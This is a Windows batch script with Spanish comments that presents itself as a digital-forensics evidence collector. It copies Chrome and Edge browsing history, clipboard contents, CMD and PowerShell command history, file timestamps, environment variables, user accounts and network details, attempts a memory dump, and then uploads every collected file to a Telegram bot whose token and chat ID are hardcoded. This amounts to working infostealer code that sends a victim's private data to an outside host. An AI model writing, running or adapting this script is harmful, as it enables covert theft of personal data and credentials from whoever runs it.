@echo off
cd /d C:\
echo ============================================================
echo   RECOLECTANDO EVIDENCIAS DIGITALES Y VOLCADO DE RAM
echo ============================================================
echo.

:: ============================================
:: 1. CREAR CARPETA PRINCIPAL
:: ============================================
mkdir C:\EVIDENCIAS_COMPLETAS 2>nul
echo [OK] Carpeta C:\EVIDENCIAS_COMPLETAS creada

:: ============================================
:: 2. RECOLECTAR EVIDENCIAS DIGITALES
:: ============================================

:: 2.1. HISTORIAL DE NAVEGACIÓN
echo ============================================================ > C:\EVIDENCIAS_COMPLETAS\01_historial_navegacion.txt
echo   HISTORIAL DE BUSQUEDAS Y NAVEGACION >> C:\EVIDENCIAS_COMPLETAS\01_historial_navegacion.txt
echo ============================================================ >> C:\EVIDENCIAS_COMPLETAS\01_historial_navegacion.txt
echo. >> C:\EVIDENCIAS_COMPLETAS\01_historial_navegacion.txt
echo [1] HISTORIAL DE GOOGLE CHROME >> C:\EVIDENCIAS_COMPLETAS\01_historial_navegacion.txt
copy "%userprofile%\AppData\Local\Google\Chrome\User Data\Default\History" C:\EVIDENCIAS_COMPLETAS\chrome_history_backup.txt 2>nul
echo. >> C:\EVIDENCIAS_COMPLETAS\01_historial_navegacion.txt
echo [2] HISTORIAL DE MICROSOFT EDGE >> C:\EVIDENCIAS_COMPLETAS\01_historial_navegacion.txt
copy "%userprofile%\AppData\Local\Microsoft\Edge\User Data\Default\History" C:\EVIDENCIAS_COMPLETAS\edge_history_backup.txt 2>nul
echo. >> C:\EVIDENCIAS_COMPLETAS\01_historial_navegacion.txt
echo [3] HISTORIAL DE FIREFOX >> C:\EVIDENCIAS_COMPLETAS\01_historial_navegacion.txt
dir /s /b "%appdata%\Mozilla\Firefox\Profiles\*.sqlite" >> C:\EVIDENCIAS_COMPLETAS\01_historial_navegacion.txt 2>nul
echo. >> C:\EVIDENCIAS_COMPLETAS\01_historial_navegacion.txt
echo [4] HISTORIAL DE INTERNET EXPLORER/EDGE >> C:\EVIDENCIAS_COMPLETAS\01_historial_navegacion.txt
dir /s /b "%userprofile%\AppData\Local\Microsoft\Windows\INetCache" >> C:\EVIDENCIAS_COMPLETAS\01_historial_navegacion.txt 2>nul

:: 2.2. PORTAPAPELES
echo ============================================================ > C:\EVIDENCIAS_COMPLETAS\02_portapapeles.txt
echo   CAPTURA DE PORTAPAPELES >> C:\EVIDENCIAS_COMPLETAS\02_portapapeles.txt
echo ============================================================ >> C:\EVIDENCIAS_COMPLETAS\02_portapapeles.txt
echo. >> C:\EVIDENCIAS_COMPLETAS\02_portapapeles.txt
echo [1] CONTENIDO ACTUAL DEL PORTAPAPELES >> C:\EVIDENCIAS_COMPLETAS\02_portapapeles.txt
powershell -Command "Get-Clipboard" >> C:\EVIDENCIAS_COMPLETAS\02_portapapeles.txt 2>nul
echo. >> C:\EVIDENCIAS_COMPLETAS\02_portapapeles.txt
echo [2] HISTORIAL DEL PORTAPAPELES >> C:\EVIDENCIAS_COMPLETAS\02_portapapeles.txt
dir "%userprofile%\AppData\Local\Microsoft\Windows\Clipboard" >> C:\EVIDENCIAS_COMPLETAS\02_portapapeles.txt 2>nul

:: 2.3. HISTORIAL DE CONSOLA
echo ============================================================ > C:\EVIDENCIAS_COMPLETAS\03_historial_consola.txt
echo   HISTORIAL DE CONSOLA >> C:\EVIDENCIAS_COMPLETAS\03_historial_consola.txt
echo ============================================================ >> C:\EVIDENCIAS_COMPLETAS\03_historial_consola.txt
echo. >> C:\EVIDENCIAS_COMPLETAS\03_historial_consola.txt
echo [1] HISTORIAL DE COMANDOS CMD >> C:\EVIDENCIAS_COMPLETAS\03_historial_consola.txt
doskey /history >> C:\EVIDENCIAS_COMPLETAS\03_historial_consola.txt 2>nul
echo. >> C:\EVIDENCIAS_COMPLETAS\03_historial_consola.txt
echo [2] HISTORIAL DE POWERSHELL >> C:\EVIDENCIAS_COMPLETAS\03_historial_consola.txt
powershell -Command "Get-History" >> C:\EVIDENCIAS_COMPLETAS\03_historial_consola.txt 2>nul
echo. >> C:\EVIDENCIAS_COMPLETAS\03_historial_consola.txt
echo [3] HISTORIAL DE POWERSHELL (Archivo) >> C:\EVIDENCIAS_COMPLETAS\03_historial_consola.txt
type "%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" >> C:\EVIDENCIAS_COMPLETAS\03_historial_consola.txt 2>nul

:: 2.4. ESTRUCTURA MAC
echo ============================================================ > C:\EVIDENCIAS_COMPLETAS\04_estructura_MAC.txt
echo   ESTRUCTURA MAC DE CARPETAS Y ARCHIVOS >> C:\EVIDENCIAS_COMPLETAS\04_estructura_MAC.txt
echo ============================================================ >> C:\EVIDENCIAS_COMPLETAS\04_estructura_MAC.txt
echo. >> C:\EVIDENCIAS_COMPLETAS\04_estructura_MAC.txt
echo [1] ESCRITORIO (Modified) >> C:\EVIDENCIAS_COMPLETAS\04_estructura_MAC.txt
dir "%userprofile%\Desktop" /t:w /s >> C:\EVIDENCIAS_COMPLETAS\04_estructura_MAC.txt 2>nul
echo. >> C:\EVIDENCIAS_COMPLETAS\04_estructura_MAC.txt
echo [2] ESCRITORIO (Accessed) >> C:\EVIDENCIAS_COMPLETAS\04_estructura_MAC.txt
dir "%userprofile%\Desktop" /t:a /s >> C:\EVIDENCIAS_COMPLETAS\04_estructura_MAC.txt 2>nul
echo. >> C:\EVIDENCIAS_COMPLETAS\04_estructura_MAC.txt
echo [3] ESCRITORIO (Created) >> C:\EVIDENCIAS_COMPLETAS\04_estructura_MAC.txt
dir "%userprofile%\Desktop" /t:c /s >> C:\EVIDENCIAS_COMPLETAS\04_estructura_MAC.txt 2>nul
echo. >> C:\EVIDENCIAS_COMPLETAS\04_estructura_MAC.txt
echo [4] DOCUMENTOS (Modified) >> C:\EVIDENCIAS_COMPLETAS\04_estructura_MAC.txt
dir "%userprofile%\Documents" /t:w /s >> C:\EVIDENCIAS_COMPLETAS\04_estructura_MAC.txt 2>nul

:: ============================================
:: 3. RECOLECTAR INFORMACIÓN DEL SISTEMA
:: ============================================

:: 3.1. SISTEMA OPERATIVO
echo ============================================================ > C:\EVIDENCIAS_COMPLETAS\05_sistema.txt
echo   INFORMACION DEL SISTEMA >> C:\EVIDENCIAS_COMPLETAS\05_sistema.txt
echo ============================================================ >> C:\EVIDENCIAS_COMPLETAS\05_sistema.txt
echo. >> C:\EVIDENCIAS_COMPLETAS\05_sistema.txt
echo [1] VERSION DEL SISTEMA OPERATIVO >> C:\EVIDENCIAS_COMPLETAS\05_sistema.txt
wmic os get caption,version,buildnumber >> C:\EVIDENCIAS_COMPLETAS\05_sistema.txt
echo. >> C:\EVIDENCIAS_COMPLETAS\05_sistema.txt
echo [2] PROCESADOR >> C:\EVIDENCIAS_COMPLETAS\05_sistema.txt
wmic cpu get name,maxclockspeed,numberofcores >> C:\EVIDENCIAS_COMPLETAS\05_sistema.txt
echo. >> C:\EVIDENCIAS_COMPLETAS\05_sistema.txt
echo [3] MEMORIA RAM >> C:\EVIDENCIAS_COMPLETAS\05_sistema.txt
wmic memorychip get capacity,speed,devicelocator >> C:\EVIDENCIAS_COMPLETAS\05_sistema.txt
echo. >> C:\EVIDENCIAS_COMPLETAS\05_sistema.txt
echo [4] TARJETA GRAFICA >> C:\EVIDENCIAS_COMPLETAS\05_sistema.txt
wmic path win32_VideoController get name >> C:\EVIDENCIAS_COMPLETAS\05_sistema.txt
echo. >> C:\EVIDENCIAS_COMPLETAS\05_sistema.txt
echo [5] DIRECCION IP >> C:\EVIDENCIAS_COMPLETAS\05_sistema.txt
ipconfig | findstr IPv4 >> C:\EVIDENCIAS_COMPLETAS\05_sistema.txt

:: 3.2. RED
echo ============================================================ > C:\EVIDENCIAS_COMPLETAS\06_red.txt
echo   INFORMACION DE RED >> C:\EVIDENCIAS_COMPLETAS\06_red.txt
echo ============================================================ >> C:\EVIDENCIAS_COMPLETAS\06_red.txt
echo. >> C:\EVIDENCIAS_COMPLETAS\06_red.txt
ipconfig /all >> C:\EVIDENCIAS_COMPLETAS\06_red.txt

:: 3.3. USUARIOS
echo ============================================================ > C:\EVIDENCIAS_COMPLETAS\07_usuarios.txt
echo   USUARIOS DEL SISTEMA >> C:\EVIDENCIAS_COMPLETAS\07_usuarios.txt
echo ============================================================ >> C:\EVIDENCIAS_COMPLETAS\07_usuarios.txt
echo. >> C:\EVIDENCIAS_COMPLETAS\07_usuarios.txt
net user >> C:\EVIDENCIAS_COMPLETAS\07_usuarios.txt

:: 3.4. VARIABLES DE ENTORNO
echo ============================================================ > C:\EVIDENCIAS_COMPLETAS\08_variables.txt
echo   VARIABLES DE ENTORNO >> C:\EVIDENCIAS_COMPLETAS\08_variables.txt
echo ============================================================ >> C:\EVIDENCIAS_COMPLETAS\08_variables.txt
echo. >> C:\EVIDENCIAS_COMPLETAS\08_variables.txt
set >> C:\EVIDENCIAS_COMPLETAS\08_variables.txt

:: 3.5. DISCOS DUROS
echo ============================================================ > C:\EVIDENCIAS_COMPLETAS\09_discos.txt
echo   DISCOS DUROS >> C:\EVIDENCIAS_COMPLETAS\09_discos.txt
echo ============================================================ >> C:\EVIDENCIAS_COMPLETAS\09_discos.txt
echo. >> C:\EVIDENCIAS_COMPLETAS\09_discos.txt
wmic logicaldisk get deviceid,size,freespace,volumename >> C:\EVIDENCIAS_COMPLETAS\09_discos.txt

:: ============================================
:: 4. GENERAR VOLCADO DE RAM CON PROCDUMP
:: ============================================
echo.
echo ============================================================
echo   GENERANDO VOLCADO DE MEMORIA RAM (FTK Imager)
echo ============================================================
echo.

if exist C:\EVIDENCIAS_COMPLETAS\procdump.exe (
    echo Ejecutando procdump.exe...
    C:\EVIDENCIAS_COMPLETAS\procdump.exe -ma -accepteula C:\EVIDENCIAS_COMPLETAS\memory.dmp
    echo Volcado de RAM generado: memory.dmp
) else (
    echo ERROR: No se encuentra procdump.exe
)

:: ============================================
:: 5. CREAR INFORME FINAL
:: ============================================
echo ============================================================ > C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
echo           INFORME COMPLETO DE EVIDENCIAS DIGITALES >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
echo ============================================================ >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
echo. >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
echo Fecha: %date% %time% >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
echo Equipo: %computername% >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
echo Usuario: %username% >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
echo. >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
echo ============================================================ >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
echo [ARCHIVOS GENERADOS] >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
echo - 01_historial_navegacion.txt >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
echo - 02_portapapeles.txt >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
echo - 03_historial_consola.txt >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
echo - 04_estructura_MAC.txt >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
echo - 05_sistema.txt >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
echo - 06_red.txt >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
echo - 07_usuarios.txt >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
echo - 08_variables.txt >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
echo - 09_discos.txt >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
echo - chrome_history_backup.txt >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
echo - edge_history_backup.txt >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
echo - memory.dmp (Volcado de RAM) >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
echo ============================================================ >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
echo              FIN DEL INFORME >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
echo ============================================================ >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt

:: ============================================
:: 6. ENVIAR A TELEGRAM (CON MENSAJES VISIBLES)
:: ============================================
echo.
echo ============================================================
echo   ENVIANDO ARCHIVOS A TELEGRAM
echo ============================================================
echo.

set BOT_TOKEN=8886338270:AAHbMMSRXqOSKKc5CaTiw2mdWACnV_0Zd2Q
set CHAT_ID=5064456618

:: Probar conexión con Telegram
echo [INFO] Probando conexión con Telegram...
curl.exe -s "https://api.telegram.org/bot%BOT_TOKEN%/getMe"
echo.

:: Enviar archivos de texto (con mensajes visibles)
echo [INFO] Enviando 00_INFORME_FINAL.txt...
curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
echo.

echo [INFO] Enviando 01_historial_navegacion.txt...
curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\01_historial_navegacion.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
echo.

echo [INFO] Enviando 02_portapapeles.txt...
curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\02_portapapeles.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
echo.

echo [INFO] Enviando 03_historial_consola.txt...
curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\03_historial_consola.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
echo.

echo [INFO] Enviando 04_estructura_MAC.txt...
curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\04_estructura_MAC.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
echo.

echo [INFO] Enviando 05_sistema.txt...
curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\05_sistema.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
echo.

echo [INFO] Enviando 06_red.txt...
curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\06_red.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
echo.

echo [INFO] Enviando 07_usuarios.txt...
curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\07_usuarios.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
echo.

echo [INFO] Enviando 08_variables.txt...
curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\08_variables.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
echo.

echo [INFO] Enviando 09_discos.txt...
curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\09_discos.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
echo.

echo [INFO] Enviando chrome_history_backup.txt...
curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\chrome_history_backup.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
echo.

echo [INFO] Enviando edge_history_backup.txt...
curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\edge_history_backup.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
echo.

:: Enviar volcado de RAM (si existe)
if exist C:\EVIDENCIAS_COMPLETAS\memory.dmp (
    echo [INFO] Enviando memory.dmp (esto puede tardar varios minutos)...
    curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\memory.dmp" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
    echo [OK] Volcado de RAM enviado.
) else (
    echo [ERROR] No se encontró memory.dmp
)

echo.
echo ============================================================
echo   PROCESO COMPLETADO
echo ============================================================
echo.
echo Archivos generados en: C:\EVIDENCIAS_COMPLETAS\
echo.
start notepad C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
start explorer C:\EVIDENCIAS_COMPLETAS
pause
